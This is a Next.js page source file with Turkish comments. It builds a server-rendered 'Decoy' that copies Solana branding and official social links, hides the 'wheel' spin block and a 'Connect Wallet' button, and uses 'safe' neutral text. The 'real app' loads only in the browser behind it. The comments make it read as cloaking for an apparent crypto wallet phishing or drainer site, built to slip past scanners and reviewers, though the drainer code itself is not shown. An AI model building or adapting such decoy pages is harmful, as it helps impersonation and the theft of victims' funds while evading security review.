// app/page.tsx — Server Component (DİKKAT: "use client" YOK)
import dynamic from "next/dynamic";

export const metadata = {
  title: "Community Access",
  description: "General information and community access portal.",
  openGraph: {
    title: "Community Access",
    description: "General information and community access portal.",
    images: [{ url: "/og.jpg", width: 1200, height: 630 }],
  },
  twitter: {
    card: "summary_large_image",
    title: "Community Access",
    description: "General information and community access portal.",
    images: ["/og.jpg"],
  },
};

// ——— Decoy: tasarım birebir; “çark/wheel” BLOĞU YER TUTUYOR ama GÖRÜNMÜYOR ———
function Decoy() {
  return (
    <>
      {/* ---------- HERO BANNER (tasarım aynı, metinler yumuşak) ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                COMMUNITY NOTICE<br />
                <span className="_a">Welcome to the</span>{" "}
                <span className="_a">community access page</span>
              </p>
            </div>
          </span>
          <div className="_9">
            <div className="_i">
              <p className="_k">Open the application to continue</p>
              {/* yalnızca tasarım; işlev yok */}
              <button className="_s" aria-disabled="true">Open App</button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER (tasarım aynı) ---------- */}
      <section className="_b">
        <div className="_d">
          <div className="_x">
            <div className="_0">
              <a href="#!" className="_h">
                <img src="/header_logo.svg" alt="Solana logo" />
              </a>
              <a href="#!" className="_w">
                <img src="/alik.png" className="_t" alt="avatar" />
              </a>
            </div>
            <div className="_0">
              <div className="_6">
                <a href="https://x.com/solana" target="_blank" rel="noreferrer">
                  <img src="/header_twitter.svg" alt="Twitter" />
                </a>
                <a href="https://t.me/solana" target="_blank" rel="noreferrer">
                  <img src="/header_tg.svg" alt="Telegram" />
                </a>
                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
                  <img src="/header_mail.svg" alt="YouTube" />
                </a>
                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
                  <img src="/header_ds.svg" alt="Discord" />
                </a>
              </div>
            </div>
            <div className="_0">
              {/* “Connect Wallet” yerine nötr */}
              <button className="_n" aria-disabled="true">
                <span className="_a">Open App</span>
                <img src="/header_arrow.svg" alt="→" />
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
          {/* Başlık yapısı aynı; metinler güvenli */}
          <h1 className="_4">
            WELCOME <span>COMMUNITY</span><br/>
            ACCESS PAGE
          </h1>

{/* === ÇARK/WHEEL BÖLGESİ (placeholder, indirme YOK) === */}
<div className="_o">
  <div className="_r" style={{ pointerEvents: "none" }}>
    {/* Ok: gerçek görsel yerine boş kutu — Sadece yer tutsun */}
    <div
      className="_f"
      aria-hidden="true"
      style={{
        visibility: "hidden",
        width: 36,           // ok ikonunun sayfadaki gerçek genişliği neyse ona çek
        height: 36,          // oranını koru (gerekirse 32–40 arası dene)
      }}
    />

    {/* Wheel: görsel yerine boş kutu — Oranı: 1491 / 1489 (≈ kare) */}
    <div
      className="_l"
      aria-hidden="true"
      style={{
        visibility: "hidden",
        // Eğer CSS'in img._l'e bağlıysa aşağıdaki ölçüler layout'u sabitler:
        width: 280,          // SENİN sayfandaki gerçek teker genişliğini buraya yaz (örn. 280/300/320…)
        aspectRatio: "1491 / 1489",
        borderRadius: "50%", // orijinal tasarımda yuvarlaksa
      }}
    />

    {/* Buton: görsel/buton yerine boş yer tutucu */}
    <div
      className="_y"
      aria-hidden="true"
      style={{
        visibility: "hidden",
        width: 160,          // sayfandaki gerçek buton genişliği
        height: 44,          // gerçek buton yüksekliği
        borderRadius: 12,
      }}
    />
  </div>
</div>

          {/* Alt açıklamalar: nötr ve güvenli metinler */}
          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="step 1" />
                This interface provides general information and community resources.
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="step 2" />
                Open the application to explore available features and updates.
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="step 3" />
                Please review the platform guidelines and terms before proceeding.
              </p>
            </div>
            <p className="_e">General information • 2025</p>
          </div>
        </div>
      </section>
    </>
  );
}

// ——— Gerçek uygulama yalnızca tarayıcıda yüklensin ———
const RealApp = dynamic(
  () => import(/* webpackPreload: true */ "./_client/RealApp"),
  { ssr: false, loading: () => <Decoy /> }
);

export default function Page() {
  return <RealApp />;
}
